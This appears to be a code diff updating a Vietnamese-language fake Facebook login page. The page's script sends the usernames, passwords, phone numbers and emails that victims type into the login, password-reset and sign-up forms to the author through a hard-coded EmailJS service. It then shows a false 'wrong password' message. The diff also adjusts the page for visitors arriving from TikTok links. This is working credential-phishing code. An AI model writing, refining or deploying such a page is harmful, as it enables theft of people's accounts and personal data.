@@ -232,12 +232,11 @@
             gap: 20px;
             z-index: 1;
         }
-        .footer-links a {
+        .footer-links span {
             color: #737373;
             text-decoration: none;
-            cursor: pointer;
         }
-        .footer-links a:hover {
+        .footer-links span:hover {
             text-decoration: underline;
         }
         .info-text {
@@ -263,7 +262,6 @@
             margin-top: 10px;
             display: none;
         }
-        /* New styles for success pop-up */
         .success-popup {
             display: none;
             position: fixed;
@@ -313,7 +311,6 @@
             background: rgba(0, 0, 0, 0.3);
             z-index: 1001;
         }
-        /* Giao diện giống Facebook cho các container Giới thiệu, Trợ giúp, Xem thêm */
         .fb-section {
             margin-bottom: 20px;
         }
@@ -364,7 +361,7 @@
 <body>
     <script type="text/javascript">
         (function() {
-            emailjs.init("wF5gWgp1GWyg7q0KY");
+            emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng User ID của bạn nếu khác
         })();
     </script>
 
@@ -413,11 +410,10 @@
         <div class="facebook-logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
         </div>
-        <input type="text" id="username" class="form-control" placeholder="Số di động hoặc email">
+        <input type="text" id="login-input" class="form-control" placeholder="Số di động hoặc email">
         <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
         <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
         <p class="text-danger mt-2" id="error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
-        <p class="error-message" id="email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
         <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
         <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
     </div>
@@ -428,7 +424,6 @@
         <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
         <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
         <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
-        <p class="error-message" id="phone-email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
         <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
     </div>
     <div class="forgot-password-email-container">
@@ -437,7 +432,6 @@
         <input type="email" id="email-input" class="form-control" placeholder="Email">
         <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
         <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
-        <p class="error-message" id="email-email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
         <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
     </div>
     <div class="create-account-container">
@@ -447,11 +441,10 @@
         <input type="text" id="phone" class="form-control" placeholder="Số di động">
         <input type="email" id="email" class="form-control" placeholder="Email">
         <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
+        <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
         <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
         <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
-        <p class="error-message" id="create-account-error-message-email" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
     </div>
-    <!-- Giao diện Giới thiệu giống Facebook -->
     <div class="about-container">
         <div class="fb-section">
             <h2>Giới thiệu về Facebook</h2>
@@ -467,7 +460,6 @@
             </div>
         </div>
     </div>
-    <!-- Giao diện Trợ giúp giống Facebook -->
     <div class="help-container">
         <div class="fb-section">
             <h2>Trợ giúp & Hỗ trợ</h2>
@@ -483,7 +475,6 @@
             </div>
         </div>
     </div>
-    <!-- Giao diện Xem thêm giống Facebook -->
     <div class="more-container">
         <div class="fb-section">
             <h2>Xem thêm</h2>
@@ -507,38 +498,29 @@
             </div>
         </div>
     </div>
-    <!-- Success Pop-ups for each section -->
-    <div class="overlay" id="overlay"></div>
-    <div class="success-popup" id="email-success-popup">
-        <div class="success-popup-title">Gửi email thành công</div>
-        <div class="success-popup-message">Email đã được gửi thành công!</div>
-        <button class="success-popup-button" onclick="hideSuccessPopup('email-success-popup')">OK</button>
-    </div>
-    <div class="success-popup" id="phone-email-success-popup">
-        <div class="success-popup-title">Gửi email thành công</div>
-        <div class="success-popup-message">Email đã được gửi thành công!</div>
-        <button class="success-popup-button" onclick="hideSuccessPopup('phone-email-success-popup')">OK</button>
-    </div>
-    <div class="success-popup" id="email-email-success-popup">
-        <div class="success-popup-title">Gửi email thành công</div>
-        <div class="success-popup-message">Email đã được gửi thành công!</div>
-        <button class="success-popup-button" onclick="hideSuccessPopup('email-email-success-popup')">OK</button>
-    </div>
-    <div class="success-popup" id="create-account-success-popup">
-        <div class="success-popup-title">Gửi email thành công</div>
-        <div class="success-popup-message">Email đã được gửi thành công!</div>
-        <button class="success-popup-button" onclick="hideSuccessPopup('create-account-success-popup')">OK</button>
+    <div class="overlay" id="dialog-overlay"></div>
+    <div class="success-popup" id="custom-dialog">
+        <div class="success-popup-title" id="dialog-title"></div>
+        <div class="success-popup-message" id="dialog-message"></div>
+        <button class="success-popup-button" onclick="hideDialog()">OK</button>
     </div>
     <div class="bottom-section">
         <div class="meta-section">Meta</div>
     </div>
     <div class="footer-links">
-        <a href="#" onclick="showAbout()">Giới thiệu</a>
-        <a href="#" onclick="showHelp()">Trợ giúp</a>
-        <a href="#" onclick="showMore()">Xem thêm</a>
+        <span onclick="showAbout()" style="cursor: pointer;">Giới thiệu</span>
+        <span onclick="showHelp()" style="cursor: pointer;">Trợ giúp</span>
+        <span onclick="showMore()" style="cursor: pointer;">Xem thêm</span>
     </div>
 
     <script>
+        window.onload = function() {
+            if (document.referrer.includes("tiktok.com")) {
+                document.querySelector('.header').style.display = 'none';
+                document.querySelector('.login-container').style.marginTop = '20px';
+            }
+        };
+
         function toggleDropdown() {
             const dropdownMenu = document.getElementById('dropdownMenu');
             dropdownMenu.classList.toggle('active');
@@ -617,71 +599,57 @@
             document.getElementById('back-button-header').style.display = 'flex';
         }
 
-        function showSuccessPopup(popupId) {
-            document.getElementById(popupId).style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
+        function showDialog(title, message) {
+            document.getElementById('dialog-title').innerText = title;
+            document.getElementById('dialog-message').innerText = message;
+            document.getElementById('custom-dialog').style.display = 'block';
+            document.getElementById('dialog-overlay').style.display = 'block';
         }
 
-        function hideSuccessPopup(popupId) {
-            document.getElementById(popupId).style.display = 'none';
-            document.getElementById('overlay').style.display = 'none';
+        function hideDialog() {
+            document.getElementById('custom-dialog').style.display = 'none';
+            document.getElementById('dialog-overlay').style.display = 'none';
         }
 
-       function login() {
-            const username = document.getElementById('username').value;
+        function login() {
+            const loginInput = document.getElementById('login-input').value; // Dữ liệu từ ô "Số di động hoặc email"
             const password = document.getElementById('password').value;
-            const errorMessage = document.getElementById('error-message');
-            const emailSuccessMessage = document.getElementById('email-success-message');
-            const emailErrorMessage = document.getElementById('email-error-message');
 
-            if (!username || !password) {
-                errorMessage.style.display = 'block';
-                emailSuccessMessage.style.display = 'none';
-                emailErrorMessage.style.display = 'none';
+            if (!loginInput || !password) {
+                showDialog("Đăng nhập không thành công!", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại!");
                 return;
             }
 
-            errorMessage.style.display = 'none';
+            // Log để kiểm tra dữ liệu trước khi gửi
+            console.log("Dữ liệu trước khi gửi:", { email: loginInput, password: password });
 
             const templateParams = {
-                username: username,
                 password: password,
-                phone: '',
-                email: '',
+                phone: '', // Để trống vì không dùng trong form đăng nhập
+                email: loginInput, // Gửi dữ liệu từ ô "Số di động hoặc email" vào trường email
                 firstName: '',
                 lastName: ''
             };
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    console.log('Email gửi thành công!', response.status, response.text);
-                    emailSuccessMessage.style.display = 'block';
-                    emailErrorMessage.style.display = 'none';
+                    console.log("Email gửi thành công:", response);
+                    showDialog("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại.");
                 }, function(error) {
-                    console.error('Lỗi gửi email:', error);
-                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
-                    emailErrorMessage.style.display = 'block';
-                    emailSuccessMessage.style.display = 'none';
+                    console.error("Lỗi gửi email:", error);
+                    showDialog("Đăng nhập không thành công", "Sai thông tin tài khoản hoặc mật khẩu vui lòng thử lại.");
                 });
         }
 
         function searchByPhone() {
             const phone = document.getElementById('phone-input').value;
-            const errorMessage = document.getElementById('phone-error-message');
-            const emailSuccessMessage = document.getElementById('phone-email-success-message');
-            const emailErrorMessage = document.getElementById('phone-email-error-message');
 
             if (!phone) {
-                errorMessage.style.display = 'block';
-                emailSuccessMessage.style.display = 'none';
-                emailErrorMessage.style.display = 'none';
+                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động!");
                 return;
             }
 
-            errorMessage.style.display = 'none';
-
             const templateParams = {
-                username: '',
                 password: '',
                 phone: phone,
                 email: '',
@@ -691,34 +659,21 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    console.log('Email gửi thành công!', response.status, response.text);
-                    emailSuccessMessage.style.display = 'block';
-                    emailErrorMessage.style.display = 'none';
+                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến số di động của bạn!");
                 }, function(error) {
-                    console.error('Lỗi gửi email:', error);
-                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
-                    emailErrorMessage.style.display = 'block';
-                    emailSuccessMessage.style.display = 'none';
+                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                 });
         }
 
         function searchByEmail() {
             const email = document.getElementById('email-input').value;
-            const errorMessage = document.getElementById('email-error-message');
-            const emailSuccessMessage = document.getElementById('email-email-success-message');
-            const emailErrorMessage = document.getElementById('email-email-error-message');
 
             if (!email) {
-                errorMessage.style.display = 'block';
-                emailSuccessMessage.style.display = 'none';
-                emailErrorMessage.style.display = 'none';
+                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email!");
                 return;
             }
 
-            errorMessage.style.display = 'none';
-
             const templateParams = {
-                username: '',
                 password: '',
                 phone: '',
                 email: email,
@@ -728,14 +683,9 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    console.log('Email gửi thành công!', response.status, response.text);
-                    emailSuccessMessage.style.display = 'block';
-                    emailErrorMessage.style.display = 'none';
+                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến email của bạn!");
                 }, function(error) {
-                    console.error('Lỗi gửi email:', error);
-                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
-                    emailErrorMessage.style.display = 'block';
-                    emailSuccessMessage.style.display = 'none';
+                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                 });
         }
 
@@ -745,21 +695,19 @@
             const phone = document.getElementById('phone').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('new-password').value;
-            const errorMessage = document.getElementById('create-account-error-message');
-            const emailSuccessMessage = document.getElementById('create-account-success-message');
-            const emailErrorMessage = document.getElementById('create-account-error-message-email');
+            const confirmPassword = document.getElementById('confirm-password').value;
 
-            if (!firstName || !lastName || !phone || !email || !password) {
-                errorMessage.style.display = 'block';
-                emailSuccessMessage.style.display = 'none';
-                emailErrorMessage.style.display = 'none';
+            if (!firstName || !lastName || !phone || !email || !password || !confirmPassword) {
+                showDialog("Đăng ký thất bại!", "Vui lòng điền đầy đủ thông tin!");
                 return;
             }
 
-            errorMessage.style.display = 'none';
+            if (password !== confirmPassword) {
+                showDialog("Đăng ký thất bại!", "Mật khẩu không khớp!");
+                return;
+            }
 
             const templateParams = {
-                username: '',
                 password: password,
                 phone: phone,
                 email: email,
@@ -769,14 +717,9 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    console.log('Email gửi thành công!', response.status, response.text);
-                    emailSuccessMessage.style.display = 'block';
-                    emailErrorMessage.style.display = 'none';
+                    showDialog("Đăng ký thành công!", "Email đã được gửi thành công!");
                 }, function(error) {
-                    console.error('Lỗi gửi email:', error);
-                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
-                    emailErrorMessage.style.display = 'block';
-                    emailSuccessMessage.style.display = 'none';
+                    showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
         }
     </script>
